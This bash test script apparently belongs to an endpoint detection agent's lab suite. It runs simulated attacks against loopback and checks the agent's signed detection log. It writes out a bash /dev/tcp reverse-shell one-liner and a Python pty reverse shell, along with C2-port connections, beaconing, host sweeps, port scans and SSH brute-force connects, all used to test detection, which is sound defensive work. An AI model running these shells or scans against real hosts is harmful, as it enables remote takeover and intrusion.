#!/bin/bash
# Lab PR 224 (W4, CM-02 / CM-03 / CM-14) — network verdicts at connect,
# reverse shells, outbound fan-out, end to end on a lab guest
# (`deploy/lab/nn-lab.sh net-check`). Run as the lab user with sudo, the
# agent installed and running with its defaults.
#
# Benign simulations only (docs: ~/northnarrow-ops/research/
# w4-malware-countermeasures.md §7): every connection goes to loopback
# (127.0.0.0/8) and carries nothing of interest — a listener that holds,
# closes or sends `id; exit`, connects closed at once — except the
# negative run (apt-get update, a git clone over HTTPS), which needs the
# guest's normal network and is skipped without it. Files only in
# `mktemp -d` directories (mode 0700), marked `nn-ms`, removed by a trap;
# every listener and client is stopped at the end of its case. Verdicts
# are read from the signed detections log (the `network` field of a record
# says whether a flow was judged at its connect, in an open-flow snapshot,
# at its close or refused in the kernel), never from the journal.
#
#   bash deploy/lab/malsim/net-check.sh [--only MS04,MS21] [--before] [--selftest]
#
#   --only     the comma-separated cases to run (default: all)
#   --before   the starting tree's expectations: where it has no verdict
#              the line says KNOWN GAP instead of FAIL, so the suite
#              measures the progress of this lot
#   --selftest no privileges, no network: the helpers' own checks
#
# Cases: MS04 (a long-lived connection to a C2 port: NN-L-NET-010 at the
# connect), MS04B (a long-lived benign flow: open-flow snapshots counted),
# MS05 (a periodic beacon: NN-L-NET-013 at the close, unchanged), MS05B (a
# staged binary on TCP/53 to a server that is no configured resolver:
# NN-L-CHAIN-002 / NN-L-NET-008; the configured stub stays exempt), MS06 /
# MS06B (bash on a /dev/tcp socket, the Python pty reverse shell: R020),
# MS06N (a systemd Accept=yes service: no R020), MS21 (a sweep, a port
# scan, repeated SSH connects: NN-L-NET-026 / 027), NEG (apt, git, ssh, a
# browser-like burst to one host: no Critical, no fan-out record).
# The kills lab PR 224 adds — R020's, the fan-out kill tier, port 53 of a
# server that is no configured resolver — are held behind the per-rule
# response policy, off by default (decision of 21/10/2026): those cases
# expect the signed record (action Log), not a kill.
set -u
HERE=$(cd "$(dirname "$0")" && pwd)
HELPER="$HERE/nn-ms-net.py"
py() { python3 -I "$HELPER" "$@"; }
DET=/var/lib/northnarrow/detections/detections.jsonl
ONLY=""
BEFORE=0
fail=0

usage() { sed -n '2,33p' "$0" | sed 's/^# \{0,1\}//'; }

while [[ $# -gt 0 ]]; do
    case $1 in
        --only) ONLY=${2:-}; shift 2 ;;
        --before) BEFORE=1; shift ;;
        --selftest) SELFTEST=1; shift ;;
        -h|--help) usage; exit 0 ;;
        *) echo "net-check: unknown argument $1" >&2; usage >&2; exit 2 ;;
    esac
done

want() { [[ -z $ONLY || ",$ONLY," == *",$1,"* ]]; }
pass() { printf 'PASS  %s %s\n' "$1" "$2"; }
bad() { printf 'FAIL  %s %s\n' "$1" "$2"; fail=1; }
gap() { printf 'KNOWN GAP %s %s\n' "$1" "$2"; }
skip() { printf 'SKIP  %s %s\n' "$1" "$2"; }
info() { printf 'INFO  %s %s\n' "$1" "$2"; }
# outcome ID OK TEXT GAPTEXT: PASS when OK is 0; else KNOWN GAP with
# --before, FAIL without.
outcome() {
    if [[ $2 -eq 0 ]]; then
        pass "$1" "$3"
    elif [[ $BEFORE -eq 1 ]]; then
        gap "$1" "$4"
    else
        bad "$1" "$3: $4"
    fi
}

if [[ ${SELFTEST:-0} -eq 1 ]]; then
    rc=0
    py selftest || rc=1
    ONLY="MS04,MS21"
    want MS04 && want MS21 && ! want MS05 || { echo "selftest FAIL: --only"; rc=1; }
    ONLY=""
    want NEG || { echo "selftest FAIL: no --only runs every case"; rc=1; }
    out=$(BEFORE=1; outcome X 1 a b; echo "fail=$fail")
    [[ $out == $'KNOWN GAP X b\nfail=0' ]] || { echo "selftest FAIL: --before ($out)"; rc=1; }
    out=$(BEFORE=0; outcome X 1 a b; echo "fail=$fail")
    [[ $out == $'FAIL  X a: b\nfail=1' ]] || { echo "selftest FAIL: outcome ($out)"; rc=1; }
    bash -n "$0" || rc=1
    [[ $rc -eq 0 ]] && echo "net-check selftest: OK"
    exit $rc
fi

NNADMIN=$(dirname "$(systemctl show -p ExecStart --value northnarrow-agent | grep -oE 'path=[^ ;]+' | head -1 | cut -d= -f2)")/nn-admin
ADMIN_KEY=${NN_ADMIN_KEY:-}
for k in /root/northnarrow-admin.key /etc/northnarrow/admin.key; do
    [[ -z $ADMIN_KEY ]] && sudo test -r "$k" && ADMIN_KEY=$k
done

WORK=$(mktemp -d /tmp/nn-ms.XXXXXX) || exit 1
chmod 700 "$WORK"
echo "nn-ms lab PR 224 scratch" > "$WORK/nn-ms"
STAGE=""
PIDS=()
UNITS=0
cleanup() {
    local p
    for p in "${PIDS[@]}"; do kill "$p" 2>/dev/null; done
    wait 2>/dev/null
    if [[ $UNITS -eq 1 ]]; then
        sudo systemctl stop nn-ms-echo.socket >/dev/null 2>&1
        sudo rm -f /run/systemd/system/nn-ms-echo.socket /run/systemd/system/nn-ms-echo@.service
        sudo systemctl daemon-reload >/dev/null 2>&1
    fi
    [[ -n $STAGE ]] && rm -rf "$STAGE"
    rm -rf "$WORK"
}
trap cleanup EXIT

det_count() { sudo cat "$DET" 2>/dev/null | wc -l; }
new_records() { sudo tail -n "+$(( $1 + 1 ))" "$DET" 2>/dev/null; }
# count_new BASE FILTER…: records written since line BASE that match
count_new() { local b=$1; shift; new_records "$b" | py records count "$@"; }
list_new() { new_records "$1" | py records list; }
# listen HOST PORT MODE SECS [TEXT]: a listener in the background, ready
listen() {
    local ready="$WORK/ready.$2"
    rm -f "$ready"
    py listen "$1" "$2" "$3" "$4" "$ready" "${5:-}" &
    PIDS+=($!)
    for _ in $(seq 50); do [[ -s $ready ]] && return 0; sleep 0.1; done
    return 1
}
stop_bg() { local p; for p in "${PIDS[@]}"; do kill "$p" 2>/dev/null; done; wait 2>/dev/null; PIDS=(); }
reset_posture() { sudo "$NNADMIN" debug force-posture observing >/dev/null 2>&1; }
# telemetry KEY: one counter of the signed `net status`, empty when unread
telemetry() {
    [[ -n $ADMIN_KEY ]] || return 0
    sudo "$NNADMIN" net status --json --key "$ADMIN_KEY" 2>/dev/null | py json-get "$1"
}
now_ms() { date +%s%3N; }

# ── MS04: a long-lived connection to a C2 port, judged at its connect ──
if want MS04; then
    b=$(det_count)
    listen 127.0.0.1 4444 hold 30 || bad MS04 "listener did not start"
    t0=$(now_ms)
    timeout 20 python3 -I "$HELPER" hold 127.0.0.1 4444 300 >/dev/null 2>&1
    rc=$?
    dt=$(( $(now_ms) - t0 ))
    sleep 1
    stop_bg
    if [[ $BEFORE -eq 1 ]]; then
        n=$(count_new "$b" --rule NN-L-NET-010_OutboundToHighRiskC2Port)
    else
        n=$(count_new "$b" --rule NN-L-NET-010_OutboundToHighRiskC2Port --network-prefix "tcp 127.0.0.1:4444 connect")
    fi
    ok=1
    [[ $n -ge 1 && $rc -eq 137 && $dt -lt 6000 ]] && ok=0
    outcome MS04 $ok "NET-010 at the connect: records=$n client rc=$rc after ${dt} ms" \
        "no NET-010 while the connection is open (rc=$rc after ${dt} ms: the verdict comes at the close)"
fi

# ── MS04B: a long-lived benign flow is re-judged by snapshots ─────────
if want MS04B; then
    if [[ -z $ADMIN_KEY ]]; then
        skip MS04B "no admin key on the guest: run \`sudo $NNADMIN net status --key <key>\` before and after a 130 s connection and compare 'open-flow snapshots judged'"
    else
        b=$(det_count)
        s0=$(telemetry net_flow_snapshots_total)
        listen 127.0.0.2 8443 hold 150 || bad MS04B "listener did not start"
        python3 -I "$HELPER" hold 127.0.0.2 8443 130 >/dev/null 2>&1
        s1=$(telemetry net_flow_snapshots_total)
        stop_bg
        n=$(count_new "$b" --network-prefix "tcp 127.0.0.2:8443")
        ok=1
        [[ -n $s0 && -n $s1 && $s1 -gt $s0 && $n -eq 0 ]] && ok=0
        outcome MS04B $ok "open-flow snapshots ${s0:-?} → ${s1:-?}, records for the flow=$n" \
            "no snapshot counter (open flows are judged at the close only)"
    fi
fi

# ── MS05: a periodic beacon, one new connection per check-in ──────────
if want MS05; then
    b=$(det_count)
    listen 127.0.0.2 8080 close 30 || bad MS05 "listener did not start"
    py beacon 127.0.0.2 8080 6 2.0
    sleep 2
    stop_bg
    if [[ $BEFORE -eq 1 ]]; then
        n=$(count_new "$b" --rule NN-L-NET-013_Beacon)
    else
        n=$(count_new "$b" --rule NN-L-NET-013_Beacon --network-prefix "tcp 127.0.0.2:8080 closed")
    fi
    ok=1; [[ $n -ge 1 ]] && ok=0
    outcome MS05 $ok "NET-013 on the beacon (judged at the close): records=$n" "no NET-013"
fi

# ── MS05B: TCP/53 from a staged binary to a server that is no resolver ──
if want MS05B; then
    if ! command -v cc >/dev/null; then
        skip MS05B "no C compiler on the guest"
    elif ! cc -O2 -o "$WORK/c53" "$HERE/connect53.c" 2>"$WORK/cc.err"; then
        bad MS05B "connect53.c does not build: $(head -c 200 "$WORK/cc.err")"
    else
        STAGE=$(mktemp -d /var/tmp/nn-ms.XXXXXX)
        chmod 700 "$STAGE"
        cp "$WORK/c53" "$STAGE/c53"
        b=$(det_count)
        "$STAGE/c53" 127.0.0.1 53 >/dev/null 2>&1
        rc=$?
        sleep 2
        if [[ $BEFORE -eq 1 ]]; then
            n=$(count_new "$b" --rule NN-L-CHAIN-002_TmpExecThenEgress --rule NN-L-NET-008_OutboundFromTmpExec)
        else
            n=$(count_new "$b" --rule NN-L-CHAIN-002_TmpExecThenEgress --rule NN-L-NET-008_OutboundFromTmpExec --network-prefix "tcp 127.0.0.1:53")
        fi
        r3=$(count_new "$b" --rule R003_ExecFromVarTmp)
        ok=1; [[ $n -ge 1 ]] && ok=0
        outcome MS05B $ok "TCP/53 to 127.0.0.1 (no configured resolver) from /var/tmp: CHAIN-002/NET-008 records=$n (R003=$r3, rc=$rc)" \
            "the port-53 exemption covers any server (R003=$r3 only)"
        if grep -qE '^[[:space:]]*nameserver[[:space:]]+127\.0\.0\.53' /etc/resolv.conf; then
            b=$(det_count)
            "$STAGE/c53" 127.0.0.53 53 >/dev/null 2>&1
            sleep 2
            n=$(count_new "$b" --rule NN-L-CHAIN-002_TmpExecThenEgress --rule NN-L-NET-008_OutboundFromTmpExec --network-prefix "tcp 127.0.0.53:53")
            [[ $n -eq 0 ]] && pass MS05B "a lookup at the configured stub 127.0.0.53 stays exempt" \
                           || bad MS05B "the configured stub 127.0.0.53 drew $n CHAIN-002/NET-008 records"
        else
            skip MS05B "127.0.0.53 is not in /etc/resolv.conf: the exempt half needs the configured stub"
        fi
        rm -rf "$STAGE"; STAGE=""
    fi
    reset_posture
fi

# ── MS06: bash with its stdio on a TCP socket (loopback listener) ─────
if want MS06; then
    b=$(det_count)
    listen 127.0.0.1 44401 send 20 'id; exit\n' || bad MS06 "listener did not start"
    timeout 15 bash -c 'exec bash -i >/dev/tcp/127.0.0.1/44401 0<&1 2>&1' >/dev/null 2>&1
    rc=$?
    sleep 1
    stop_bg
    n=$(count_new "$b" --rule R020_ShellWithSocketStdio --severity Critical --network-prefix "stdio tcp 127.0.0.1:44401 outbound")
    ok=1; [[ $n -ge 1 ]] && ok=0
    outcome MS06 $ok "R020 Critical on bash -i over /dev/tcp: records=$n (rc=$rc)" "no verdict on the shell"
    reset_posture
fi

# ── MS06B: the Python pty reverse shell (socket on the parent's stdio) ──
if want MS06B; then
    b=$(det_count)
    listen 127.0.0.1 44402 send 20 'exit\n' || bad MS06B "listener did not start"
    timeout 15 python3 -I "$HELPER" pty-shell 127.0.0.1 44402 >/dev/null 2>&1
    rc=$?
    sleep 1
    stop_bg
    n=$(count_new "$b" --rule R020_ShellWithSocketStdio --network-prefix "parent-stdio tcp 127.0.0.1:44402 outbound")
    ok=1; [[ $n -ge 1 ]] && ok=0
    outcome MS06B $ok "R020 on the shell a pty-wrapped reverse shell spawns: records=$n (rc=$rc)" "no verdict"
    reset_posture
fi

# ── MS06N: a systemd socket-activated service (Accept=yes) is no shell ──
if want MS06N; then
    UNITS=1
    printf '%s\n' '# nn-ms lab PR 224' '[Unit]' 'Description=nn-ms lab echo (lab PR 224)' \
        '[Socket]' 'ListenStream=127.0.0.1:44403' 'Accept=yes' \
        | sudo tee /run/systemd/system/nn-ms-echo.socket >/dev/null
    printf '%s\n' '# nn-ms lab PR 224' '[Unit]' 'Description=nn-ms lab echo instance' \
        '[Service]' "ExecStart=/bin/sh -c 'exec /bin/cat'" 'StandardInput=socket' \
        | sudo tee /run/systemd/system/nn-ms-echo@.service >/dev/null
    sudo systemctl daemon-reload
    b=$(det_count)
    if sudo systemctl start nn-ms-echo.socket; then
        reply=$(py once 127.0.0.1 44403 'nn-ms\n' 2>/dev/null)
        sleep 1
        n=$(count_new "$b" --rule R020_ShellWithSocketStdio)
        if [[ $reply == nn-ms* && $n -eq 0 ]]; then
            pass MS06N "a shell systemd handed an accepted socket (Accept=yes): echo answered, no R020"
        else
            bad MS06N "Accept=yes service: reply='${reply:0:20}' R020 records=$n"
        fi
    else
        skip MS06N "the socket unit did not start"
    fi
    sudo systemctl stop nn-ms-echo.socket >/dev/null 2>&1
    sudo rm -f /run/systemd/system/nn-ms-echo.socket /run/systemd/system/nn-ms-echo@.service
    sudo systemctl daemon-reload
    UNITS=0
fi

# ── MS21: outbound fan-out — a sweep, a port scan, an SSH brute force ──
if want MS21; then
    b=$(det_count)
    py sweep 127.0.0.2-127.0.0.200 9
    sleep 1
    n=$(count_new "$b" --rule NN-L-NET-026_ScanFanOut --severity High --action Log)
    ok=1; [[ $n -ge 1 ]] && ok=0
    outcome MS21 $ok "199 hosts on port 9: NET-026 records (Log)=$n" "a sweep of 199 hosts draws no rule (posture only)"
    b=$(det_count)
    py sweep 127.0.1.1-127.0.3.88 9
    sleep 2
    # The record at 64 hosts and the kill tier at 512, its kill held behind
    # the per-rule policy (off by default): two Log records.
    n=$(count_new "$b" --rule NN-L-NET-026_ScanFanOut --action Log)
    k=$(count_new "$b" --rule NN-L-NET-026_ScanFanOut --action KillProcess)
    ok=1; [[ $n -ge 2 && $k -eq 0 ]] && ok=0
    outcome MS21 $ok "600 hosts on port 9: NET-026 records=$n (the kill tier's held: kills=$k)" "a sweep of 600 hosts draws no rule"
    b=$(det_count)
    py ports 127.0.0.1 1-400
    sleep 1
    n=$(count_new "$b" --rule NN-L-NET-026_ScanFanOut)
    ok=1; [[ $n -ge 1 ]] && ok=0
    outcome MS21 $ok "400 ports of 127.0.0.1: NET-026 records=$n" "a port scan draws no rule"
    b=$(det_count)
    py brute 127.0.0.1 22 25 0.2
    sleep 1
    n=$(count_new "$b" --rule NN-L-NET-027_OutboundAuthBruteforce --severity High)
    ok=1; [[ $n -ge 1 ]] && ok=0
    outcome MS21 $ok "25 connects to 127.0.0.1:22: NET-027 records=$n" "repeated SSH connects draw no rule"
    reset_posture
fi

# ── NEG: routine network use draws no Critical and no fan-out record ──
if want NEG; then
    b=$(det_count)
    online=0
    if timeout 30 sudo apt-get update -qq >/dev/null 2>&1; then online=1; else info NEG "apt-get update failed (no network?)"; fi
    if [[ $online -eq 1 ]]; then
        timeout 60 git clone -q --depth 1 https://github.com/octocat/Hello-World "$WORK/clone" >/dev/null 2>&1 \
            || info NEG "git clone failed"
        urls=()
        for _ in $(seq 40); do urls+=(https://archive.ubuntu.com/ubuntu/); done
        timeout 60 curl -s -o /dev/null --parallel --parallel-max 20 "${urls[@]}" || info NEG "curl burst failed"
    else
        skip NEG "no network: apt, git and the HTTPS burst are not run"
    fi
    timeout 10 ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=3 localhost true >/dev/null 2>&1
    listen 127.0.0.3 8443 hold 20 && py burst 127.0.0.3 8443 40 >/dev/null
    stop_bg
    sleep 2
    crit=$(count_new "$b" --severity Critical)
    fan=$(count_new "$b" --rule NN-L-NET-026_ScanFanOut --rule NN-L-NET-027_OutboundAuthBruteforce)
    others=$(list_new "$b" | awk '{print $1}' | sort | uniq -c | tr '\n' ' ')
    [[ -n $others ]] && info NEG "records during the negative run: $others"
    [[ $crit -eq 0 && $fan -eq 0 ]] && pass NEG "apt, git, ssh and a 40-connection burst: no Critical, no fan-out record" \
                                    || bad NEG "Critical records=$crit, fan-out records=$fan"
    reset_posture
fi

[[ $fail -eq 0 ]] && echo "net-check: OK" || echo "net-check: FAILED"
exit $fail
